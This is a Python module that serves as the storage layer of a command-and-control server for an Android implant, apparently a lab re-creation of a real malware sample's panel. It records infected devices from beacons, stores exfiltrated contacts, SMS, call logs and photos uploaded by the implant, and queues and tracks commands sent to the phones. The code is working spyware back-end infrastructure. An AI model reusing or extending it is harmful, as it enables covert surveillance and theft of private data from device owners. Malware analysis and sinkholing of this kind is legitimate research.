"""Persistence layer for the VexR lab C2.

Split out of server.py so the storage schema and the HTTP layer can be reasoned
about (and tested) separately. Everything here is synchronous SQLite; the
FastAPI layer wraps the hot paths in a threadpool.

Two kinds of evidence arrive from the implant and they are stored differently:

  * *beacons*   -- small JSON payloads pushed to /panel.php. Either the v=3
                   encrypted envelope or (when the implant's RSA step fails) the
                   plain `action=...&Model=...` form from gm1.a().
  * *artifacts* -- arbitrary files pushed to /file.php. Command results land
                   here: contacts, SMS dumps, gallery images, app lists. The
                   implant posts them as a raw request body with no encryption
                   at all, so the handler must not assume an envelope.

Artifacts are written to disk and only their metadata goes in SQLite, so a
gallery scan does not bloat the database.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import sqlite3
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Iterable, Optional

BASE_DIR = Path(__file__).resolve().parent

# Where state lives. On Railway the container filesystem is ephemeral: without a
# mounted volume, every redeploy silently discards the database and every
# uploaded artifact. `/data` is the mount path of the attached volume, so prefer
# it whenever it exists and fall back to the source tree for local runs.
_DATA_MOUNT = Path(os.environ.get("VEXR_DATA_DIR", "/data"))
_STATE_DIR = _DATA_MOUNT if _DATA_MOUNT.is_dir() else BASE_DIR

DB_PATH = Path(os.environ.get("VEXR_DB", _STATE_DIR / "vexr_lab.db"))
ARTIFACT_DIR = Path(os.environ.get("VEXR_ARTIFACTS", _STATE_DIR / "artifacts"))

SCHEMA = """
PRAGMA journal_mode=WAL;

CREATE TABLE IF NOT EXISTS devices (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT UNIQUE NOT NULL,
    model         TEXT,
    manufacturer  TEXT,
    android_ver   TEXT,
    sdk_version   TEXT,
    app_label     TEXT,
    app_version   TEXT,
    first_seen    TEXT NOT NULL,
    last_seen     TEXT NOT NULL,
    beacon_count  INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS beacons (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    action        TEXT,
    payload       TEXT,
    transport     TEXT NOT NULL DEFAULT 'encrypted',
    received_at   TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_beacons_device ON beacons(device_key, id DESC);

CREATE TABLE IF NOT EXISTS artifacts (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    filename      TEXT NOT NULL,
    stored_name   TEXT NOT NULL,
    content_type  TEXT,
    size_bytes    INTEGER NOT NULL DEFAULT 0,
    sha256        TEXT,
    kind          TEXT,
    command_id    INTEGER,
    received_at   TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_artifacts_device ON artifacts(device_key, id DESC);

CREATE TABLE IF NOT EXISTS commands (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    command       TEXT NOT NULL,
    params        TEXT,
    status        TEXT NOT NULL DEFAULT 'pending',
    created_at    TEXT NOT NULL,
    sent_at       TEXT,
    completed_at  TEXT,
    artifact_id   INTEGER,
    note          TEXT
);
CREATE INDEX IF NOT EXISTS idx_commands_device ON commands(device_key, status);

CREATE TABLE IF NOT EXISTS log (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    ts            TEXT NOT NULL,
    level         TEXT NOT NULL,
    message       TEXT NOT NULL
);
"""

# Files the implant uploads are named after what they contain; use that to label
# them in the UI without asking the operator to open anything.
_KIND_PATTERNS = [
    (re.compile(r"^contacts?_", re.I), "contacts"),
    (re.compile(r"^sms_", re.I), "sms"),
    (re.compile(r"^call_?log", re.I), "calllog"),
    (re.compile(r"^(img|photo|gallery|image)_", re.I), "image"),
    (re.compile(r"^apps?_", re.I), "apps"),
    (re.compile(r"\.(jpg|jpeg|png|webp|gif|bmp)$", re.I), "image"),
    (re.compile(r"\.(zip|tar|gz|7z)$", re.I), "archive"),
    (re.compile(r"\.(txt|csv|json|log)$", re.I), "text"),
]


def classify(filename: str) -> str:
    for pattern, kind in _KIND_PATTERNS:
        if pattern.search(filename):
            return kind
    return "other"


def utcnow() -> str:
    return datetime.now(timezone.utc).isoformat()


@contextmanager
def db():
    """Yield a connection with row access by name and WAL enabled."""
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DB_PATH, timeout=15)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    try:
        yield conn
        conn.commit()
    finally:
        conn.close()


# Columns added after the first deployment. A live database created by the old
# server.py will be missing these, so they are added in place rather than by
# dropping tables -- the device rows are real evidence and must survive.
_MIGRATIONS = {
    "devices": [
        ("manufacturer", "TEXT"),
        ("sdk_version", "TEXT"),
        ("app_label", "TEXT"),
        ("app_version", "TEXT"),
    ],
    "beacons": [("transport", "TEXT NOT NULL DEFAULT 'plain'")],
    "commands": [
        ("completed_at", "TEXT"),
        ("artifact_id", "INTEGER"),
        ("note", "TEXT"),
    ],
}


def _columns(conn: sqlite3.Connection, table: str) -> set[str]:
    try:
        return {row[1] for row in conn.execute(f"PRAGMA table_info({table})")}
    except sqlite3.Error:
        return set()


def _migrate(conn: sqlite3.Connection) -> list[str]:
    """Bring an existing database up to the current schema. Idempotent."""
    applied: list[str] = []

    for table, columns in _MIGRATIONS.items():
        existing = _columns(conn, table)
        if not existing:
            continue  # table will be created by SCHEMA
        for name, decl in columns:
            if name not in existing:
                try:
                    conn.execute(f"ALTER TABLE {table} ADD COLUMN {name} {decl}")
                    applied.append(f"{table}.{name}")
                except sqlite3.Error as exc:  # noqa: BLE001
                    print(f"migration warning: {table}.{name}: {exc}", flush=True)

    # The old schema called uploaded files `files`; carry the rows across so a
    # gallery scan taken before the refactor is still visible. `artifacts` is
    # created by SCHEMA, so this can only run once that has happened -- see the
    # second call in init_db().
    return applied


def _migrate_files_table(conn: sqlite3.Connection) -> list[str]:
    """Move legacy `files` rows into `artifacts`. Requires both to exist."""
    if not _columns(conn, "files") or not _columns(conn, "artifacts"):
        return []
    if conn.execute("SELECT COUNT(*) FROM artifacts").fetchone()[0]:
        return []  # already migrated
    try:
        before = conn.total_changes
        conn.execute(
            "INSERT INTO artifacts (device_key, filename, stored_name,"
            " content_type, size_bytes, sha256, kind, received_at)"
            " SELECT device_key, filename, filename, NULL, size_bytes,"
            " NULL, 'other', received_at FROM files"
        )
        moved = conn.total_changes - before
        return [f"files -> artifacts ({moved} rows)"]
    except sqlite3.Error as exc:  # noqa: BLE001
        print(f"migration warning: files -> artifacts: {exc}", flush=True)
        return []


def init_db() -> None:
    ARTIFACT_DIR.mkdir(parents=True, exist_ok=True)
    with db() as conn:
        # Column adds must happen BEFORE the schema script: CREATE TABLE IF NOT
        # EXISTS leaves an old table untouched, and the new indexes reference
        # columns the old table does not have yet.
        applied = _migrate(conn)
        conn.executescript(SCHEMA)
        # The files -> artifacts copy needs `artifacts` to exist, so it runs after.
        applied += _migrate_files_table(conn)
        if applied:
            print(f"migrated: {', '.join(applied)}", flush=True)


def log(level: str, message: str) -> None:
    """Append to the operator-visible log, and to stdout for Railway."""
    print(f"{utcnow()} {level:5s} {message}", flush=True)
    try:
        with db() as conn:
            conn.execute(
                "INSERT INTO log (ts, level, message) VALUES (?, ?, ?)",
                (utcnow(), level, message),
            )
            # keep the table bounded; the dashboard only ever shows the tail
            conn.execute(
                "DELETE FROM log WHERE id <= (SELECT MAX(id) - 5000 FROM log)"
            )
    except Exception:  # noqa: BLE001 - logging must never break a request
        pass


# ---------------------------------------------------------------------------
# Devices
# ---------------------------------------------------------------------------

_DEVICE_FIELD_MAP = {
    "device_id": "device_key",
    "Device_id": "device_key",
    "imei": "device_key",
    "model": "model",
    "Model": "model",
    "manufacturer": "manufacturer",
    "android_version": "android_ver",
    "andver": "android_ver",
    "sdk_version": "sdk_version",
    "sdk": "sdk_version",
    "app_label": "app_label",
    "app_version": "app_version",
}


def register_device(payload: dict[str, Any]) -> str:
    """Upsert a device from any beacon shape; returns its key."""
    fields: dict[str, Any] = {}
    for src, dst in _DEVICE_FIELD_MAP.items():
        if src in payload and payload[src] not in (None, ""):
            fields[dst] = str(payload[src])

    device_key = fields.pop("device_key", None) or "unknown"
    now = utcnow()

    with db() as conn:
        row = conn.execute(
            "SELECT id FROM devices WHERE device_key = ?", (device_key,)
        ).fetchone()
        if row is None:
            conn.execute(
                "INSERT INTO devices (device_key, model, manufacturer, android_ver,"
                " sdk_version, app_label, app_version, first_seen, last_seen, beacon_count)"
                " VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)",
                (
                    device_key,
                    fields.get("model"),
                    fields.get("manufacturer"),
                    fields.get("android_ver"),
                    fields.get("sdk_version"),
                    fields.get("app_label"),
                    fields.get("app_version"),
                    now,
                    now,
                ),
            )
        else:
            # COALESCE so a sparse heartbeat never erases detail we already have
            conn.execute(
                "UPDATE devices SET last_seen = ?, beacon_count = beacon_count + 1,"
                " model = COALESCE(?, model),"
                " manufacturer = COALESCE(?, manufacturer),"
                " android_ver = COALESCE(?, android_ver),"
                " sdk_version = COALESCE(?, sdk_version),"
                " app_label = COALESCE(?, app_label),"
                " app_version = COALESCE(?, app_version)"
                " WHERE device_key = ?",
                (
                    now,
                    fields.get("model"),
                    fields.get("manufacturer"),
                    fields.get("android_ver"),
                    fields.get("sdk_version"),
                    fields.get("app_label"),
                    fields.get("app_version"),
                    device_key,
                ),
            )
    return device_key


def record_beacon(device_key: str, action: Optional[str], payload: dict, transport: str) -> int:
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO beacons (device_key, action, payload, transport, received_at)"
            " VALUES (?, ?, ?, ?, ?)",
            (device_key, action, json.dumps(payload), transport, utcnow()),
        )
        return int(cur.lastrowid)


# ---------------------------------------------------------------------------
# Artifacts (uploaded files)
# ---------------------------------------------------------------------------

def _safe_name(name: str) -> str:
    name = Path(name).name
    name = re.sub(r"[^A-Za-z0-9._-]+", "_", name).strip("._") or "artifact"
    return name[:120]


def store_artifact(
    device_key: str,
    filename: str,
    data: bytes,
    content_type: Optional[str] = None,
    command_id: Optional[int] = None,
) -> dict[str, Any]:
    """Persist an uploaded file and return its metadata row."""
    ARTIFACT_DIR.mkdir(parents=True, exist_ok=True)
    safe = _safe_name(filename)
    digest = hashlib.sha256(data).hexdigest()
    stamp = utcnow().replace(":", "").replace("-", "")[:15]
    stored_name = f"{stamp}_{digest[:8]}_{safe}"
    path = ARTIFACT_DIR / stored_name
    path.write_bytes(data)

    kind = classify(safe)
    now = utcnow()
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO artifacts (device_key, filename, stored_name, content_type,"
            " size_bytes, sha256, kind, command_id, received_at)"
            " VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (
                device_key,
                safe,
                stored_name,
                content_type,
                len(data),
                digest,
                kind,
                command_id,
                now,
            ),
        )
        artifact_id = int(cur.lastrowid)
        if command_id is not None:
            conn.execute(
                "UPDATE commands SET status = 'completed', completed_at = ?,"
                " artifact_id = ? WHERE id = ?",
                (now, artifact_id, command_id),
            )
    return {
        "id": artifact_id,
        "device_key": device_key,
        "filename": safe,
        "stored_name": stored_name,
        "content_type": content_type,
        "size_bytes": len(data),
        "sha256": digest,
        "kind": kind,
        "command_id": command_id,
        "received_at": now,
    }


def artifact_path(stored_name: str) -> Optional[Path]:
    """Resolve a stored artifact, refusing anything that escapes the directory."""
    candidate = (ARTIFACT_DIR / Path(stored_name).name).resolve()
    try:
        candidate.relative_to(ARTIFACT_DIR.resolve())
    except ValueError:
        return None
    return candidate if candidate.is_file() else None


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

def queue_command(device_key: str, command: str, params: Optional[str] = None) -> int:
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO commands (device_key, command, params, created_at)"
            " VALUES (?, ?, ?, ?)",
            (device_key, command, params, utcnow()),
        )
        return int(cur.lastrowid)


def claim_pending_commands(device_key: str) -> list[str]:
    """Return and mark-sent every queued command for a device."""
    with db() as conn:
        rows = conn.execute(
            "SELECT id, command FROM commands"
            " WHERE device_key = ? AND status = 'pending' ORDER BY id",
            (device_key,),
        ).fetchall()
        now = utcnow()
        for row in rows:
            conn.execute(
                "UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ?",
                (now, row["id"]),
            )
    return [row["command"] for row in rows]


def expire_stale_commands(minutes: int = 15) -> int:
    """Mark commands that were delivered but never produced an artifact.

    Without this the dashboard shows 'sent' forever and the operator cannot tell
    a slow command from a silently failed one.
    """
    with db() as conn:
        cur = conn.execute(
            "UPDATE commands SET status = 'expired', note = 'no artifact within window'"
            " WHERE status = 'sent'"
            " AND sent_at IS NOT NULL"
            " AND julianday('now') - julianday(sent_at) > ?",
            (minutes / 1440.0,),
        )
        return cur.rowcount


def pending_for(device_key: str) -> list[dict[str, Any]]:
    with db() as conn:
        return [
            dict(r)
            for r in conn.execute(
                "SELECT * FROM commands WHERE device_key = ?"
                " AND status IN ('pending','sent') ORDER BY id DESC",
                (device_key,),
            )
        ]


# ---------------------------------------------------------------------------
# Read models for the API
# ---------------------------------------------------------------------------

ONLINE_WINDOW_SECONDS = 120


def _online(last_seen: Optional[str]) -> bool:
    if not last_seen:
        return False
    try:
        seen = datetime.fromisoformat(last_seen)
    except ValueError:
        return False
    if seen.tzinfo is None:
        seen = seen.replace(tzinfo=timezone.utc)
    return (datetime.now(timezone.utc) - seen).total_seconds() <= ONLINE_WINDOW_SECONDS


def list_devices() -> list[dict[str, Any]]:
    with db() as conn:
        rows = [dict(r) for r in conn.execute("SELECT * FROM devices ORDER BY last_seen DESC")]
        for d in rows:
            d["beacons"] = conn.execute(
                "SELECT COUNT(*) AS c FROM beacons WHERE device_key = ?", (d["device_key"],)
            ).fetchone()["c"]
            d["artifacts"] = conn.execute(
                "SELECT COUNT(*) AS c FROM artifacts WHERE device_key = ?",
                (d["device_key"],),
            ).fetchone()["c"]
            d["commands_pending"] = conn.execute(
                "SELECT COUNT(*) AS c FROM commands WHERE device_key = ?"
                " AND status IN ('pending','sent')",
                (d["device_key"],),
            ).fetchone()["c"]
            d["online"] = _online(d.get("last_seen"))
            if not d.get("android_ver"):
                row = conn.execute(
                    "SELECT payload FROM beacons WHERE device_key = ? ORDER BY id DESC LIMIT 1",
                    (d["device_key"],),
                ).fetchone()
                if row:
                    try:
                        d["android_ver"] = json.loads(row["payload"]).get("android_version")
                    except Exception:  # noqa: BLE001
                        pass
    return rows


def get_device(device_key: str) -> Optional[dict[str, Any]]:
    for d in list_devices():
        if d["device_key"] == device_key:
            return d
    return None


def list_beacons(limit: int = 100, device_key: Optional[str] = None) -> list[dict[str, Any]]:
    with db() as conn:
        if device_key:
            rows = conn.execute(
                "SELECT * FROM beacons WHERE device_key = ? ORDER BY id DESC LIMIT ?",
                (device_key, limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM beacons ORDER BY id DESC LIMIT ?", (limit,)
            ).fetchall()
    out = []
    for r in rows:
        d = dict(r)
        try:
            d["payload_parsed"] = json.loads(d["payload"])
        except Exception:  # noqa: BLE001
            d["payload_parsed"] = None
        out.append(d)
    return out


def list_artifacts(limit: int = 100, device_key: Optional[str] = None) -> list[dict[str, Any]]:
    with db() as conn:
        if device_key:
            rows = conn.execute(
                "SELECT * FROM artifacts WHERE device_key = ? ORDER BY id DESC LIMIT ?",
                (device_key, limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM artifacts ORDER BY id DESC LIMIT ?", (limit,)
            ).fetchall()
    return [dict(r) for r in rows]


def list_commands(limit: int = 100, device_key: Optional[str] = None) -> list[dict[str, Any]]:
    with db() as conn:
        if device_key:
            rows = conn.execute(
                "SELECT * FROM commands WHERE device_key = ? ORDER BY id DESC LIMIT ?",
                (device_key, limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM commands ORDER BY id DESC LIMIT ?", (limit,)
            ).fetchall()
    return [dict(r) for r in rows]


def list_log(limit: int = 100) -> list[dict[str, Any]]:
    with db() as conn:
        return [
            dict(r)
            for r in conn.execute("SELECT * FROM log ORDER BY id DESC LIMIT ?", (limit,))
        ]


def stats() -> dict[str, Any]:
    with db() as conn:
        devices = conn.execute("SELECT COUNT(*) AS c FROM devices").fetchone()["c"]
        beacons = conn.execute("SELECT COUNT(*) AS c FROM beacons").fetchone()["c"]
        artifacts = conn.execute("SELECT COUNT(*) AS c FROM artifacts").fetchone()["c"]
        commands = conn.execute("SELECT COUNT(*) AS c FROM commands").fetchone()["c"]
        pending = conn.execute(
            "SELECT COUNT(*) AS c FROM commands WHERE status IN ('pending','sent')"
        ).fetchone()["c"]
        completed = conn.execute(
            "SELECT COUNT(*) AS c FROM commands WHERE status = 'completed'"
        ).fetchone()["c"]
        rows = conn.execute("SELECT last_seen FROM devices").fetchall()
    return {
        "devices": devices,
        "online": sum(1 for r in rows if _online(r["last_seen"])),
        "beacons": beacons,
        "artifacts": artifacts,
        "commands": commands,
        "commands_pending": pending,
        "commands_completed": completed,
    }
